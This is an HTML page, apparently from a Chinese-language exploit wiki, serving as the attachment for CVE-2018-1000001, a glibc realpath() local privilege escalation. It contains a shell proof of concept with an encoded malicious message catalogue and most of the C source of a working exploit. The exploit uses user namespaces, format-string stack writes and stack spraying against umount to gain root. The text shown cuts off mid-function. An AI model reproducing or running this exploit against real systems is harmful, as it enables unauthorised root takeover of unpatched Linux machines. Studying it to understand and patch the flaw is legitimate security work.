<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  
  <link rel="shortcut icon" href="../../img/favicon.ico">
  <title>Cve 2018 1000001 附件 - expwiki</title>
  <link href='https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700' rel='stylesheet' type='text/css'>

  <link rel="stylesheet" href="../../css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../../css/theme_extra.css" type="text/css" />
  <link rel="stylesheet" href="../../css/highlight.css">
  
  <script>
    // Current page data
    var mkdocs_page_name = "Cve 2018 1000001 \u9644\u4ef6";
    var mkdocs_page_input_path = "userspace/cve-2018-1000001-\u9644\u4ef6.md";
    var mkdocs_page_url = "/userspace/cve-2018-1000001-\u9644\u4ef6/";
  </script>
  
  <script src="../../js/jquery-2.1.1.min.js"></script>
  <script src="../../js/modernizr-2.8.3.min.js"></script>
  <script type="text/javascript" src="../../js/highlight.pack.js"></script> 
  
</head>

<body class="wy-body-for-nav" role="document">

  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
      <div class="wy-side-nav-search">
        <a href="../.." class="icon icon-home"> expwiki</a>
        <div role="search">
  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
  </form>
</div>
      </div>

      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
	<ul class="current">
	  
          
            <li class="toctree-l1">
		
    <a class="" href="../..">前言</a>
	    </li>
          
            <li class="toctree-l1">
		
    <span class="caption-text">linux用户态漏洞</span>
    <ul class="subnav">
                <li class="">
                    
    <a class="" href="../cve-2018-1000001-分析/">Cve 2018 1000001 分析</a>
                </li>
                <li class=" current">
                    
    <a class="current" href="./">Cve 2018 1000001 附件</a>
    <ul class="subnav">
            
    <li class="toctree-l3"><a href="#glibccve-2018-1000001">Glibc本地提权漏洞分析附件(CVE-2018-1000001)</a></li>
    
        <ul>
        
            <li><a class="toctree-l4" href="#poc">poc源码</a></li>
        
            <li><a class="toctree-l4" href="#exp">exp源码</a></li>
        
        </ul>
    

    </ul>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2019-12735-分析/">Cve 2019 12735 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2019-12735-附件/">Cve 2019 12735 附件</a>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2019-5736-分析/">Cve 2019 5736 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2019-5736-附件/">Cve 2019 5736 附件</a>
                </li>
    </ul>
	    </li>
          
            <li class="toctree-l1">
		
    <span class="caption-text">linux内核态漏洞</span>
    <ul class="subnav">
                <li class="">
                    
    <a class="" href="../../kernel/cve-2018-18281-分析/">Cve 2018 18281 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../../kernel/cve-2018-18281-附件/">Cve 2018 18281 附件</a>
                </li>
                <li class="">
                    
    <a class="" href="../../kernel/cve-2019-13272-分析/">Cve 2019 13272 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../../kernel/cve-2019-13272-附件/">Cve 2019 13272 附件</a>
                </li>
    </ul>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../../acknowledgements/">致谢</a>
	    </li>
          
        </ul>
      </div>
      &nbsp;
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
        <a href="../..">expwiki</a>
      </nav>

      
      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="breadcrumbs navigation">
  <ul class="wy-breadcrumbs">
    <li><a href="../..">Docs</a> &raquo;</li>
    
      
        
          <li>linux用户态漏洞 &raquo;</li>
        
      
    
    <li>Cve 2018 1000001 附件</li>
    <li class="wy-breadcrumbs-aside">
      
    </li>
  </ul>
  <hr/>
</div>
          <div role="main">
            <div class="section">
              
                <h1 id="glibccve-2018-1000001">Glibc本地提权漏洞分析附件(CVE-2018-1000001)</h1>
<h3 id="poc">poc源码</h3>
<pre><code class="shell"># Line 1
root$ echo 1 &gt; /proc/sys/kernel/unprivileged_userns_clone
# Line 2-5
/usr/bin/unshare -m -U --map-root-user /bin/bash
mount -t tmpfs tmpfs /tmp
cd /tmp
chmod 00755 .


# Line 6-9
mkdir -p -- &quot;(unreachable)/tmp&quot; &quot;(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES&quot; &quot;(unreachable)/x&quot;
ln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A &quot;(unreachable)/tmp/down&quot;
base64 -d &lt;&lt;B64-EOF | bzip2 -cd &gt; &quot;(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES/util-linux.mo&quot;
QlpoOTFBWSZTWTOfm9IAAGX/pn6UlARGB+FeKyZnAD/n3mACAAAgAAEgAJSIqfkpspk0eUGJ6gAG
mQeoaD1PJAamlPJGCNMTIaNGmnqMQ0AAzSwpEWpQICVUw+490ohZBgZ+s4EBAZCn/TavSQshtCiv
iG6HOehyAp4FPt3zkpdTxNchTYITLBkXUjsgpN2QDBNX8qmbpkVgfLXKcQc1ZhVF0FxUQOtnbGlL
5NhRmORwmQF1Dw3Yu1mds6tGAmnLwWwc2KRKGl5hcLuSKcKEgZz83pA=
B64-EOF
echo &quot;$$&quot;
2299


# Line 10-11
test$ cd /proc/2299/cwd
test$ LC_ALL=C.UTF-8 /bin/umount --lazy down /
umount: AAlnAAAAAAAAAAA


</code></pre>

<h3 id="exp">exp源码</h3>
<pre><code class="c">/** This software is provided by the copyright owner &quot;as is&quot;
 *  and without any expressed or implied warranties, including,
 *  but not limited to, the implied warranties of merchantability
 *  and fitness for a particular purpose are disclaimed. In no
 *  event shall the copyright owner be liable for any direct,
 *  indirect, incidential, special, exemplary or consequential
 *  damages, including, but not limited to, procurement of substitute
 *  goods or services, loss of use, data or profits or business
 *  interruption, however caused and on any theory of liability,
 *  whether in contract, strict liability, or tort, including
 *  negligence or otherwise, arising in any way out of the use
 *  of this software, even if advised of the possibility of such
 *  damage.
 *
 *  Copyright (c) 2018 halfdog &lt;me (%) halfdog.net&gt;
 *  See https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/ for more information.
 *
 *  This tool exploits a buffer underflow in glibc realpath()
 *  and was tested against latest release from Debian, Ubuntu
 *  Mint. It is intended as demonstration of ASLR-aware exploitation
 *  techniques. It uses relative binary offsets, that may be different
 *  for various Linux distributions and builds. Please send me
 *  a patch when you developed a new set of parameters to add
 *  to the osSpecificExploitDataList structure and want to contribute
 *  them.
 *
 *  Compile: gcc -o RationalLove RationalLove.c
 *  Run: ./RationalLove
 *
 *  You may also use &quot;--Pid&quot; parameter, if you want to test the
 *  program on already existing namespaced or chrooted mounts.
 *
 *  Revisions:
 *  * 20180722: Fixed escalation failure on Xenial desktop install
 *    related to definition of &quot;/&quot; in &quot;/run/mount/utab&quot;. Also
 *    fixed compiler warnings.
 */


#define _GNU_SOURCE
#include &lt;assert.h&gt;
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;limits.h&gt;
#include &lt;poll.h&gt;
#include &lt;sched.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/mount.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;time.h&gt;
#include &lt;unistd.h&gt;




#define UMOUNT_ENV_VAR_COUNT 256


/** Dump that number of bytes from stack to perform anti-ASLR.
 *  This number should be high enough to reproducible reach the
 *  stack region sprayed with (UMOUNT_ENV_VAR_COUNT*8) bytes of
 *  environment variable references but low enough to avoid hitting
 *  upper stack limit, which would cause a crash.
 */
#define STACK_LONG_DUMP_BYTES 4096


char *messageCataloguePreamble=&quot;Language: en\n&quot;
    &quot;MIME-Version: 1.0\n&quot;
    &quot;Content-Type: text/plain; charset=UTF-8\n&quot;
    &quot;Content-Transfer-Encoding: 8bit\n&quot;;


/** The pid of a namespace process with the working directory
 *  at a writable /tmp only visible by the process. */
pid_t namespacedProcessPid=-1;


int killNamespacedProcessFlag=1;


/** The pathname to the umount binary to execute. */
char *umountPathname;


/** The pathname to the named pipe, that will synchronize umount
 *  binary with supervisory process before triggering the second
 *  and last exploitation phase.
 */
char *secondPhaseTriggerPipePathname;


/** The pathname to the second phase exploitation catalogue file.
 *  This is needed as the catalogue cannot be sent via the trigger
 *  pipe from above.
 */
char *secondPhaseCataloguePathname;


/** The OS-release detected via /etc/os-release. */
char *osRelease=NULL;


/** This table contains all relevant information to adapt the
 *  attack to supported Linux distros (fully updated) to support
 *  also older versions, hash of umount/libc/libmount should be
 *  used also for lookups.
 *  The 4th string is an array of 4-byte integers, that are addressed
 *  using the &quot;ED_...&quot; constants.
 */
// Stack offset of libmount ctx pointer when addressing it via
// printf format string argument skipping syntax, thus causing
// 8 byte words to be skipped when incrementing by one.
#define ED_STACK_OFFSET_CTX 0
// Format string argument skipping for argv array.
#define ED_STACK_OFFSET_ARGV 1
// Format string argument skipping for argv[0].
#define ED_STACK_OFFSET_ARG0 2
// Delta of getdate() function from __libc_start_main position
// after return from main().
#define ED_LIBC_GETDATE_DELTA 3
// Delta of execl() function from __libc_start_main ...
#define ED_LIBC_EXECL_DELTA 4
static char* osSpecificExploitDataList[]={
// Debian Stretch
    &quot;\&quot;9 (stretch)\&quot;&quot;,
    &quot;../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A&quot;,
    &quot;__gconv_find_shlib&quot;,
    &quot;\x06\0\0\0\x24\0\0\0\x3e\0\0\0\x7f\xb9\x08\x00\xef\x85\x09\x00&quot;,
    NULL};


char **osReleaseExploitData=NULL;


/** Locate the umount binary within the given search path list,
 *  elements separated by colons.
 *  @return a pointer to a malloced memory region containing the
 *  string or NULL if not found.
 */
char* findUmountBinaryPathname(char *searchPath) {
  char *testPathName=(char*)malloc(PATH_MAX);
  assert(testPathName);


  while(*searchPath) {
    char *endPtr=strchr(searchPath, ':');
    int length=endPtr-searchPath;
    if(!endPtr) {
      length=strlen(searchPath);
      endPtr=searchPath+length-1;
    }
    int result=snprintf(testPathName, PATH_MAX, &quot;%.*s/%s&quot;, length,
        searchPath, &quot;umount&quot;);
    if(result&gt;=PATH_MAX) {
      fprintf(stderr, &quot;Binary search path element too long, ignoring it.\n&quot;);
    } else {
      struct stat statBuf;
      result=stat(testPathName, &amp;statBuf);
// Just assume, that umount is owner-executable. There might be
// alternative ACLs, which grant umount execution only to selected
// groups, but it would be unusual to have different variants
// of umount located searchpath on the same host.
      if((!result)&amp;&amp;(S_ISREG(statBuf.st_mode))&amp;&amp;(statBuf.st_mode&amp;S_IXUSR)) {
        return(testPathName);
      }
    }
    searchPath=endPtr+1;
  }


  free(testPathName);
  return(NULL);
}




/** Get the value for a given field name.
 *  @return NULL if not found, a malloced string otherwise.
 */
char* getReleaseFileField(char *releaseData, int dataLength, char *fieldName) {
  int nameLength=strlen(fieldName);
  while(dataLength&gt;0) {
    char *nextPos=memchr(releaseData, '\n', dataLength);
    int lineLength=dataLength;
    if(nextPos) {
      lineLength=nextPos-releaseData;
      nextPos++;
    } else {
      nextPos=releaseData+dataLength;
    }
    if((!strncmp(releaseData, fieldName, nameLength))&amp;&amp;
        (releaseData[nameLength]=='=')) {
      return(strndup(releaseData+nameLength+1, lineLength-nameLength-1));
    }
    releaseData=nextPos;
    dataLength-=lineLength;
  }
  return(NULL);
}




/** Detect the release by reading the VERSION field from /etc/os-release.
 *  @return 0 on success.
 */
int detectOsRelease() {
  int handle=open(&quot;/etc/os-release&quot;, O_RDONLY);
  if(handle&lt;0)
    return(-1);


  char *buffer=alloca(1024);
  int infoLength=read(handle, buffer, 1024);
  close(handle);
  if(infoLength&lt;0)
    return(-1);
  osRelease=getReleaseFileField(buffer, infoLength, &quot;VERSION&quot;);
  if(!osRelease)
    osRelease=getReleaseFileField(buffer, infoLength, &quot;NAME&quot;);
  if(osRelease) {
    fprintf(stderr, &quot;Detected OS version: %s\n&quot;, osRelease);
    return(0);
  }


  return(-1);
}




/** Create the catalogue data in memory.
 *  @return a pointer to newly allocated catalogue data memory
 */
char* createMessageCatalogueData(char **origStringList, char **transStringList,
    int stringCount, int *catalogueDataLength) {
  int contentLength=strlen(messageCataloguePreamble)+2;
  for(int stringPos=0; stringPos&lt;stringCount; stringPos++) {
    contentLength+=strlen(origStringList[stringPos])+
        strlen(transStringList[stringPos])+2;
  }
  int preambleLength=(0x1c+0x14*(stringCount+1)+0xc)&amp;-0xf;
  char *catalogueData=(char*)malloc(preambleLength+contentLength);
  memset(catalogueData, 0, preambleLength);
  int *preambleData=(int*)catalogueData;
  *preambleData++=0x950412de;
  preambleData++;
  *preambleData++=stringCount+1;
  *preambleData++=0x1c;
  *preambleData++=(*(preambleData-2))+(stringCount+1)*sizeof(int)*2;
  *preambleData++=0x5;
  *preambleData++=(*(preambleData-3))+(stringCount+1)*sizeof(int)*2;


  char *nextCatalogueStringStart=catalogueData+preambleLength;
  for(int stringPos=-1; stringPos&lt;stringCount; stringPos++) {
    char *writeString=(stringPos&lt;0)?&quot;&quot;:origStringList[stringPos];
    int length=strlen(writeString);
    *preambleData++=length;
    *preambleData++=(nextCatalogueStringStart-catalogueData);
    memcpy(nextCatalogueStringStart, writeString, length+1);
    nextCatalogueStringStart+=length+1;
  }
  for(int stringPos=-1; stringPos&lt;stringCount; stringPos++) {
    char *writeString=(stringPos&lt;0)?messageCataloguePreamble:transStringList[stringPos];
    int length=strlen(writeString);
    *preambleData++=length;
    *preambleData++=(nextCatalogueStringStart-catalogueData);
    memcpy(nextCatalogueStringStart, writeString, length+1);
    nextCatalogueStringStart+=length+1;
  }
  assert(nextCatalogueStringStart-catalogueData==preambleLength+contentLength);
  for(int stringPos=0; stringPos&lt;=stringCount+1; stringPos++) {
//    *preambleData++=(stringPos+1);
    *preambleData++=(int[]){1, 3, 2, 0, 4}[stringPos];
  }
  *catalogueDataLength=preambleLength+contentLength;
  return(catalogueData);
}




/** Create the catalogue data from the string lists and write
 *  it to the given file.
 *  @return 0 on success.
 */
int writeMessageCatalogue(char *pathName, char **origStringList,
    char **transStringList, int stringCount) {
  int catalogueFd=open(pathName, O_WRONLY|O_CREAT|O_TRUNC|O_NOCTTY, 0644);
  if(catalogueFd&lt;0) {
    fprintf(stderr, &quot;Failed to open catalogue file %s for writing.\n&quot;,
        pathName);
    return(-1);
  }
  int catalogueDataLength;
  char *catalogueData=createMessageCatalogueData(
      origStringList, transStringList, stringCount, &amp;catalogueDataLength);
  int result=write(catalogueFd, catalogueData, catalogueDataLength);
  assert(result==catalogueDataLength);
  close(catalogueFd);
  free(catalogueData);
  return(0);
}


void createDirectoryRecursive(char *namespaceMountBaseDir, char *pathName) {
  char pathBuffer[PATH_MAX];
  int pathNameLength=0;
  while(1) {
    char *nextPathSep=strchr(pathName+pathNameLength, '/');
    if(nextPathSep) {
      pathNameLength=nextPathSep-pathName;
    } else {
      pathNameLength=strlen(pathName);
    }
    int result=snprintf(pathBuffer, sizeof(pathBuffer), &quot;%s/%.*s&quot;,
        namespaceMountBaseDir, pathNameLength, pathName);
    assert(result&lt;PATH_MAX);
    result=mkdir(pathBuffer, 0755);
    assert((!result)||(errno==EEXIST));
    if(!pathName[pathNameLength])
      break;
    pathNameLength++;
  }
}




/** This child function prepares the namespaced mount point and
 *  then waits to be killed later on.
 */
static int usernsChildFunction() {
  while(geteuid()!=0) {
    sched_yield();
  }
  int result=mount(&quot;tmpfs&quot;, &quot;/tmp&quot;, &quot;tmpfs&quot;, MS_MGC_VAL, NULL);
  assert(!result);
  assert(!chdir(&quot;/tmp&quot;));
  int handle=open(&quot;ready&quot;, O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW|O_NOCTTY, 0644);
  assert(handle&gt;=0);
  close(handle);
  sleep(100000);
}


/** Prepare a process living in an own mount namespace and setup
 *  the mount structure appropriately. The process is created
 *  in a way allowing cleanup at program end by just killing it,
 *  thus removing the namespace.
 *  @return the pid of that process or -1 on error.
 */
pid_t prepareNamespacedProcess() {
  if(namespacedProcessPid==-1) {
    fprintf(stderr, &quot;No pid supplied via command line, trying to create a namespace\nCAVEAT: /proc/sys/kernel/unprivileged_userns_clone must be 1 on systems with USERNS protection.\n&quot;);


    char *stackData=(char*)malloc(1&lt;&lt;20);
    assert(stackData);
    namespacedProcessPid=clone(usernsChildFunction, stackData+(1&lt;&lt;20),
        CLONE_NEWUSER|CLONE_NEWNS|SIGCHLD, NULL);
    if(namespacedProcessPid==-1) {
      fprintf(stderr, &quot;USERNS clone failed: %d (%s)\n&quot;, errno, strerror(errno));
      return(-1);
    }


    char idMapFileName[128];
    char idMapData[128];
    sprintf(idMapFileName, &quot;/proc/%d/setgroups&quot;, namespacedProcessPid);
    int setGroupsFd=open(idMapFileName, O_WRONLY);
    assert(setGroupsFd&gt;=0);
    int result=write(setGroupsFd, &quot;deny&quot;, 4);
    assert(result&gt;0);
    close(setGroupsFd);


    sprintf(idMapFileName, &quot;/proc/%d/uid_map&quot;, namespacedProcessPid);
    int uidMapFd=open(idMapFileName, O_WRONLY);
    assert(uidMapFd&gt;=0);
    sprintf(idMapData, &quot;0 %d 1\n&quot;, getuid());
    result=write(uidMapFd, idMapData, strlen(idMapData));
    assert(result&gt;0);
    close(uidMapFd);


    sprintf(idMapFileName, &quot;/proc/%d/gid_map&quot;, namespacedProcessPid);
    int gidMapFd=open(idMapFileName, O_WRONLY);
    assert(gidMapFd&gt;=0);
    sprintf(idMapData, &quot;0 %d 1\n&quot;, getgid());
    result=write(gidMapFd, idMapData, strlen(idMapData));
    assert(result&gt;0);
    close(gidMapFd);


// After setting the maps for the child process, the child may
// start setting up the mount point. Wait for that to complete.
    sleep(1);
    fprintf(stderr, &quot;Namespaced filesystem created with pid %d\n&quot;,
        namespacedProcessPid);
  }


//   osReleaseExploitData=osSpecificExploitDataList;
//   if(osRelease) {
// // If an OS was detected, try to find it in list. Otherwise use
// // default.
//     for(int tPos=0; osSpecificExploitDataList[tPos]; tPos+=4) {
//       if(!strcmp(osSpecificExploitDataList[tPos], osRelease)) {
//         osReleaseExploitData=osSpecificExploitDataList+tPos;
//         break;
//       }
//     }
//   }
  osReleaseExploitData = osSpecificExploitDataList;


  char pathBuffer[PATH_MAX];
  int result=snprintf(pathBuffer, sizeof(pathBuffer), &quot;/proc/%d/cwd&quot;,
     namespacedProcessPid);
  assert(result&lt;PATH_MAX);
  char *namespaceMountBaseDir=strdup(pathBuffer);
  assert(namespaceMountBaseDir);


// Create directories needed for umount to proceed to final state
// &quot;not mounted&quot;.
  createDirectoryRecursive(namespaceMountBaseDir, &quot;(unreachable)/x&quot;);
  result=snprintf(pathBuffer, sizeof(pathBuffer),
      &quot;(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES&quot;, osReleaseExploitData[2]);
  assert(result&lt;PATH_MAX);
  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);
  result=snprintf(pathBuffer, sizeof(pathBuffer),
      &quot;(unreachable)/tmp/%s/X.X/LC_MESSAGES&quot;, osReleaseExploitData[2]);
  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);
  result=snprintf(pathBuffer, sizeof(pathBuffer),
      &quot;(unreachable)/tmp/%s/X.x/LC_MESSAGES&quot;, osReleaseExploitData[2]);
  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);


// Create symlink to trigger underflows.
  result=snprintf(pathBuffer, sizeof(pathBuffer), &quot;%s/(unreachable)/tmp/down&quot;,
      namespaceMountBaseDir);
  assert(result&lt;PATH_MAX);
  result=symlink(osReleaseExploitData[1], pathBuffer);
  assert(!result||(errno==EEXIST));


// getdate will leave that string in rdi to become the filename
// to execute for the next round.
  char *selfPathName=realpath(&quot;/proc/self/exe&quot;, NULL);
  result=snprintf(pathBuffer, sizeof(pathBuffer), &quot;%s/DATEMSK&quot;,
      namespaceMountBaseDir);
  assert(result&lt;PATH_MAX);
  int handle=open(pathBuffer, O_WRONLY|O_CREAT|O_TRUNC, 0755);
  assert(handle&gt;0);
  result=snprintf(pathBuffer, sizeof(pathBuffer), &quot;#!%s\nunused&quot;,
      selfPathName);
  assert(result&lt;PATH_MAX);
  result=write(handle, pathBuffer, result);
  close(handle);
  free(selfPathName);


// Write the initial message catalogue to trigger stack dumping
// and to make the &quot;umount&quot; call privileged by toggling the &quot;restricted&quot;
// flag in the context.
  result=snprintf(pathBuffer, sizeof(pathBuffer),
      &quot;%s/(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES/util-linux.mo&quot;,
      namespaceMountBaseDir, osReleaseExploitData[2]);
  assert(result&lt;PATH_MAX);


  char *stackDumpStr=(char*)malloc(0x80+6*(STACK_LONG_DUMP_BYTES/8));
  assert(stackDumpStr);
  char *stackDumpStrEnd=stackDumpStr;
  stackDumpStrEnd+=sprintf(stackDumpStrEnd, &quot;AA%%%d$lnAAAAAA&quot;,
      ((int*)osReleaseExploitData[3])[ED_STACK_OFFSET_CTX]);
  for(int dumpCount=(STACK_LONG_DUMP_BYTES/8); dumpCount; dumpCount--) {
    memcpy(stackDumpStrEnd, &quot;%016lx&quot;, 6);
    stackDumpStrEnd+=6;
  }
// We wrote allready 8 bytes, write so many more to produce a
// count of 'L' and write that to the stack. As all writes so
// sum up to a count aligned by 8, and 'L'==0x4c, we will have
// to write at least 4 bytes, which is longer than any &quot;%hhx&quot;
// format string output. Hence do not care about the byte content
// here. The target write address has a 16 byte alignment due
// to varg structure.
  stackDumpStrEnd+=sprintf(stackDumpStrEnd, &quot;%%1$%dhhx%%%d$hhn&quot;,
      ('L'-8-STACK_LONG_DUMP_BYTES*2)&amp;0xff,
      STACK_LONG_DUMP_BYTES/16);
  *stackDumpStrEnd=0;
  result=writeMessageCatalogue(pathBuffer,
      (char*[]){
          &quot;%s: mountpoint not found&quot;,
          &quot;%s: not mounted&quot;,
          &quot;%s: target is busy\n        (In some cases useful info about processes that\n         use the device is found by lsof(8) or fuser(1).)&quot;
      },
      (char*[]){&quot;1234&quot;, stackDumpStr, &quot;5678&quot;},
      3);
  assert(!result);
  free(stackDumpStr);


  result=snprintf(pathBuffer, sizeof(pathBuffer),
      &quot;%s/(unreachable)/tmp/%s/X.X/LC_MESSAGES/util-linux.mo&quot;,
      namespaceMountBaseDir, osReleaseExploitData[2]);
  assert(result&lt;PATH_MAX);
  result=mknod(pathBuffer, S_IFIFO|0666, S_IFIFO);
  assert((!result)||(errno==EEXIST));
  secondPhaseTriggerPipePathname=strdup(pathBuffer);


  result=snprintf(pathBuffer, sizeof(pathBuffer),
      &quot;%s/(unreachable)/tmp/%s/X.x/LC_MESSAGES/util-linux.mo&quot;,
      namespaceMountBaseDir, osReleaseExploitData[2]);
  secondPhaseCataloguePathname=strdup(pathBuffer);


  free(namespaceMountBaseDir);
  return(namespacedProcessPid);
}






/** Create the format string to write an arbitrary value to the
 *  stack. The created format string avoids to interfere with
 *  the complex fprintf format handling logic by accessing fprintf
 *  internal state on stack. Thus the modification method does
 *  not depend on that ftp internals. The current libc fprintf
 *  implementation copies values for formatting before applying
 *  the %n writes, therefore pointers changed by fprintf operation
 *  can only be utilized with the next fprintf invocation. As
 *  we cannot rely on a stack having a suitable number of pointers
 *  ready for arbitrary writes, we need to create those pointers
 *  one by one. Everything needed is pointer on stack pointing
 *  to another valid pointer and 4 helper pointers pointing to
 *  writeable memory. The **argv list matches all those requirements.
 *  @param printfArgvValuePos the position of the argv pointer from
 *  printf format string view.
 *  @param argvStackAddress the address of the argv list, where
 *  the argv[0] pointer can be read.
 *  @param printfArg0ValuePos the position of argv list containing
 *  argv[0..n] pointers.
 *  @param mainFunctionReturnAddress the address on stack where
 *  the return address from the main() function to _libc_start()
 *  is stored.
 *  @param writeValue the value to write to mainFunctionReturnAddress
 */
void createStackWriteFormatString(
    char *formatBuffer, int bufferSize, int printfArgvValuePos,
    void *argvStackAddress, int printfArg0ValuePos,
    void *mainFunctionReturnAddress, unsigned short *writeData,
    int writeDataLength) {
  int result=0;
  int currentValue=-1;
  for(int nextWriteValue=0; nextWriteValue&lt;0x10000;) {
// Find the lowest value to write.
    nextWriteValue=0x10000;
    for(int valuePos=0; valuePos&lt;writeDataLength; valuePos++) {
       int value=writeData[valuePos];
       if((value&gt;currentValue)&amp;&amp;(value&lt;nextWriteValue))
         nextWriteValue=value;
    }
    if(currentValue&lt;0)
      currentValue=0;
    if(currentValue!=nextWriteValue) {
      result=snprintf(formatBuffer, bufferSize, &quot;%%1$%1$d.%1$ds&quot;,
          nextWriteValue-currentValue);
      formatBuffer+=result;
      bufferSize-=result;
      currentValue=nextWriteValue;
    }
    for(int valuePos=0; valuePos&lt;writeDataLength; valuePos++) {
       if(writeData[valuePos]==nextWriteValue) {
          result=snprintf(formatBuffer, bufferSize,
              &quot;%%%d$hn&quot;, printfArg0ValuePos+valuePos+1);
          formatBuffer+=result;
          bufferSize-=result;
       }
    }
  }


// Print the return function address location number of bytes
// except 8 (those from the LABEL counter) and write the value
// to arg1.
  int writeCount=((long long)mainFunctionReturnAddress-18)&amp;0xffff;
  result=snprintf(formatBuffer, bufferSize,
      &quot;%%1$%d.%ds%%1$s%%1$s%%%d$hn&quot;,
      writeCount, writeCount, printfArg0ValuePos);
  formatBuffer+=result;
  bufferSize-=result;


// Write the LABEL 6 more times, thus multiplying the the single
// byte write pointer to an 8-byte aligned argv-list pointer and
// update argv[0] to point to argv[1..n].
  writeCount=(((long long)argvStackAddress)-(writeCount+56))&amp;0xffff;
  result=snprintf(formatBuffer, bufferSize,
      &quot;%%1$s%%1$s%%1$s%%1$s%%1$s%%1$s%%1$%d.%ds%%%d$hn&quot;,
      writeCount, writeCount, printfArgvValuePos);
  formatBuffer+=result;
  bufferSize-=result;


// Append a debugging preamble.
  result=snprintf(formatBuffer, bufferSize, &quot;-%%35$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%78$s\n&quot;,
      printfArgvValuePos, printfArg0ValuePos-1, printfArg0ValuePos,
      printfArg0ValuePos+1, printfArg0ValuePos+2, printfArg0ValuePos+3,
      printfArg0ValuePos+4, printfArg0ValuePos+5, printfArg0ValuePos+6);
  formatBuffer+=result;
  bufferSize-=result;
}




/** Wait for the trigger pipe to open. The pipe will be closed
 *  immediately after opening it.
 *  @return 0 when the pipe was opened before hitting a timeout.
 */
int waitForTriggerPipeOpen(char *pipeName) {
  struct timespec startTime, currentTime;
  int result=clock_gettime(CLOCK_MONOTONIC, &amp;startTime);
  startTime.tv_sec+=10;
  assert(!result);
  while(1) {
    int pipeFd=open(pipeName, O_WRONLY|O_NONBLOCK);
    if(pipeFd&gt;=0) {
      close(pipeFd);
      break;
    }
    result=clock_gettime(CLOCK_MONOTONIC, &amp;currentTime);
    if(currentTime.tv_sec&gt;startTime.tv_sec) {
      return(-1);
    }
    currentTime.tv_sec=0;
    currentTime.tv_nsec=100000000;
    nanosleep(&amp;currentTime, NULL);
  }
  return(0);
}




/** Invoke umount to gain root privileges.
 *  @return 0 if the umount process terminated with expected exit
 *  status.
 */
int attemptEscalation() {
  int escalationSuccess=-1;


  char targetCwd[64];
  snprintf(
      targetCwd, sizeof(targetCwd)-1, &quot;/proc/%d/cwd&quot;, namespacedProcessPid);


  int pipeFds[2];
  int result=pipe(pipeFds);
  assert(!result);


  pid_t childPid=fork();
  assert(childPid&gt;=0);
  if(!childPid) {
// This is the child process.
    close(pipeFds[0]);
    fprintf(stderr, &quot;Starting subprocess\n&quot;);
    dup2(pipeFds[1], 1);
    dup2(pipeFds[1], 2);
    close(pipeFds[1]);
    result=chdir(targetCwd);
    assert(!result);


// Create so many environment variables for a kind of &quot;stack spraying&quot;.
    int envCount=UMOUNT_ENV_VAR_COUNT;
    char **umountEnv=(char**)malloc((envCount+1)*sizeof(char*));
    assert(umountEnv);
    umountEnv[envCount--]=NULL;
    umountEnv[envCount--]=&quot;LC_ALL=C.UTF-8&quot;;
    while(envCount&gt;=0) {
      umountEnv[envCount--]=&quot;AANGUAGE=X.X&quot;;
    }
// Use the built-in C locale.
// Invoke umount first by overwriting heap downwards using links
// for &quot;down&quot;, then retriggering another error message (&quot;busy&quot;)
// with hopefully similar same stack layout for other path &quot;/run&quot;.
// The path &quot;/&quot; cannot be used as it is registered in &quot;/run/mount/utab&quot;
// on standard desktop Xenial installs, thus triggering different
// code path.
    char* umountArgs[]={umountPathname, &quot;/run&quot;, &quot;/run&quot;, &quot;/run&quot;, &quot;/run&quot;, &quot;/run&quot;, &quot;/run&quot;, &quot;/run&quot;, &quot;/run&quot;, &quot;/run&quot;, &quot;/run&quot;, &quot;down&quot;, &quot;LABEL=78&quot;, &quot;LABEL=789&quot;, &quot;LABEL=789a&quot;, &quot;LABEL=789ab&quot;, &quot;LABEL=789abc&quot;, &quot;LABEL=789abcd&quot;, &quot;LABEL=789abcde&quot;, &quot;LABEL=789abcdef&quot;, &quot;LABEL=789abcdef0&quot;, &quot;LABEL=789abcdef0&quot;, NULL};
